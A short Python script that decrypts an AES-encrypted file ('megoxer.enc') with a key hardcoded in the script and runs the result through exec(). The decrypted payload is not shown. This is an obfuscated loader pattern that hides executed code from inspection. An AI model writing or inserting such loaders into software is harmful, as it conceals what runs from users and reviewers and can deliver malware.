import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

KEY = base64.b64decode("vy+UJgcL1nNPrUJvGKRC+xHy0v6UCrgmajlNUKtYb8Y=")

def aes_decrypt(data, key):
    raw_data = base64.b64decode(data)
    iv, encrypted = raw_data[:16], raw_data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(encrypted), AES.block_size).decode()

with open("megoxer.enc", "r", encoding="utf-8") as enc_file:
    encrypted_script = enc_file.read()

exec(aes_decrypt(encrypted_script, KEY))
